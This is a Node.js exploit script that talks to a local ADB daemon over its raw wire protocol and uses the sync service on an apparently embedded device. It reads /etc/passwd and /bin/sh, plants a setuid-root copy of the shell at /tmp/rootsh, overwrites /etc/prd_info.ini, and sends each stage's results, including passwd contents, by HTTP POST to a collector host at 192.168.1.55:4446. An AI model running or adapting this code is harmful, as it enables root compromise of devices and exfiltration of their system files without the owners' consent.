var net = require('net');
var http = require('http');
var HOST = '192.168.1.55';
function post(b) {
    try {
        var r = http.request({ host: HOST, port: 4446, method: 'POST', path: '/r' }, function () {});
        r.on('error', function () {});
        r.write(b || '');
        r.end();
    } catch (e) {}
}
post('C12?start');
function crc(b) { var res = 0; for (var i = 0; i < b.length; ++i) res = (res + b[i]) & 0xFFFFFFFF; return res >>> 0; }
function pkt(cmd, a1, a2, payload) {
    var b = new Buffer(24 + payload.length);
    b.writeUInt32LE(cmd, 0); b.writeUInt32LE(a1, 4); b.writeUInt32LE(a2, 8);
    b.writeUInt32LE(payload.length, 12); b.writeUInt32LE(crc(payload), 16);
    b.writeUInt32LE((0xFFFFFFFF - cmd) >>> 0, 20);
    payload.copy(b, 24);
    return b;
}
var s = net.connect(26101, '127.0.0.1');
var buf = new Buffer(0);
var inner = new Buffer(0);
var MYID = 12345;
var syncRemote = -1;
var stage = 0; // 1 list/, 2 recv passwd, 3 recv sh, 4 send marker, 5 send rootsh, 6 send prd, 7 list mnt, 8 done
var recvBuf = null;
var shBytes = null;

function syncWrite(data) { s.write(pkt(0x45545257, MYID, syncRemote, data)); }
function sreq(cmd, payload) {
    var b = new Buffer(8 + payload.length);
    b.write(cmd, 0, 'ascii');
    b.writeUInt32LE(payload.length, 4);
    b.write(payload, 8, 'ascii');
    syncWrite(b);
}
function go() {
    stage++;
    post('C12?stage=' + stage);
    if (stage === 1) sreq('LIST', '/');
    else if (stage === 2) { recvBuf = new Buffer(0); sreq('RECV', '/etc/passwd'); }
    else if (stage === 3) { recvBuf = new Buffer(0); sreq('RECV', '/bin/sh'); }
    else if (stage === 4) sreq('SEND', '/tmp/sync_pwn.txt,0644');
    else if (stage === 5) sreq('SEND', '/tmp/rootsh,04755');
    else if (stage === 6) sreq('SEND', '/etc/prd_info.ini,0644');
    else if (stage === 7) sreq('LIST', '/mnt/systemrw');
    else post('C12?done');
}
function handleInner(payload) {
    inner = Buffer.concat([inner, payload]);
    while (inner.length >= 8) {
        var sc = inner.slice(0, 4).toString('ascii');
        var slen = inner.readUInt32LE(4);
        if (inner.length < 8 + slen) break;
        var data = inner.slice(8, 8 + slen);
        inner = inner.slice(8 + slen);
        if (sc === 'OKAY') {
            if (stage === 4) { syncWrite(new Buffer('S12_MARKER_OK')); }
            else if (stage === 5) { post('C12?rootsh_okay len=' + slen); syncWrite(shBytes); }
            else if (stage === 6) { post('C12?prd_okay len=' + slen); }
            else if (stage === 2 || stage === 3) { go(); }
        } else if (sc === 'DATA' && (stage === 2 || stage === 3)) {
            recvBuf = Buffer.concat([recvBuf, data]);
        } else if (sc === 'DENT') {
        } else if (sc === 'DONE') {
            if (stage === 2) post('C12?passwd=' + recvBuf.toString('ascii', 0, 300));
            if (stage === 3) { shBytes = recvBuf; post('C12?sh_size=' + shBytes.length); }
            go();
        } else if (sc === 'FAIL') {
            post('C12?FAIL[' + stage + ']=' + data.toString('ascii', 0, 200));
            go();
        } else {
            post('C12?sync[' + stage + ']=' + sc);
        }
    }
}
s.on('connect', function () {
    post('C12?tcp=ok');
    s.write(pkt(0x4e584e43, 0x01000000, 4096, new Buffer('host::\0', 'binary')));
});
s.on('data', function (d) {
    buf = Buffer.concat([buf, d]);
    while (buf.length >= 24) {
        var cmd = buf.readUInt32LE(0);
        var a1 = buf.readUInt32LE(4);
        var a2 = buf.readUInt32LE(8);
        var len = buf.readUInt32LE(12);
        if (buf.length < 24 + len) break;
        var payload = buf.slice(24, 24 + len);
        buf = buf.slice(24 + len);
        if (cmd === 0x4e584e43) {
            post('C12?cnxn=' + payload.toString('ascii'));
            s.write(pkt(0x4e45504f, MYID, 0, new Buffer('sync:\0', 'binary')));
        } else if (cmd === 0x59414b4f && syncRemote === -1) {
            syncRemote = a1;
            post('C12?sync_ok');
            go();
        } else if (cmd === 0x45545257 && a2 === MYID) {
            s.write(pkt(0x59414b4f, MYID, a1, new Buffer(0)));
            handleInner(payload);
        } else if (cmd === 0x45534c43 && a2 === MYID) {
            post('C12?stream_closed');
        }
    }
});
s.on('error', function (e) { post('C12?err=' + e.message); });
s.on('close', function () { post('C12?closed_sock'); });
